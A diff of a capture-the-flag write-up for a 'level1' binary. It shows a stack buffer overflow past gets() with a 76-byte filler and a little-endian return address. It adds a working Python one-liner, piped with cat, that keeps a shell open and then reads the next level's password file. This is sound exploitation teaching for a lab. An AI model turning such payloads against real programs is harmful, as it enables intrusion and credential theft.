@@ -83,9 +83,10 @@ Then we have all we need to build our payload. The size of our buffer is equal
 to the address of the return address minus the start of the buffer:
 `bffffb5c-bffffb10 = 76`. This means that our payload should look like that:
 
-| 0 ... 76    | 77 ... 80                  |
-|-------------|----------------------------|
-| filler data | run's address (0x08048444) |
+| byte ranges (inclusive) | data                       |
+|-------------------------|----------------------------|
+| [0 ... 76]              | whatever                   |
+| [77 ... 80]             | run's address (0x08048444) |
 
 
 ```shell
@@ -95,3 +96,23 @@ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' | ./level1
 
 > Note that the return address bytes have been reversed since we're dealing with
 > a little endian system.
+
+The command above will output the fallowing, meaning that we indeed reached and
+exeucted the run() function:
+
+```
+Good... Wait what?
+Segmentation fault (core dumped)
+```
+
+However the shell does not wait because stdin has been closed after gets(). To
+remdey this, we need to execute the payload command in a sub shell and to call
+an other command that will keep the shell pipe open:
+
+```shell
+# keep the pipe open with cat
+(python -c 'print "a" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+# then we have access to the shell
+whoami # -> level2
+cat /home/user/level2/.pass # -> [the flag]
+```
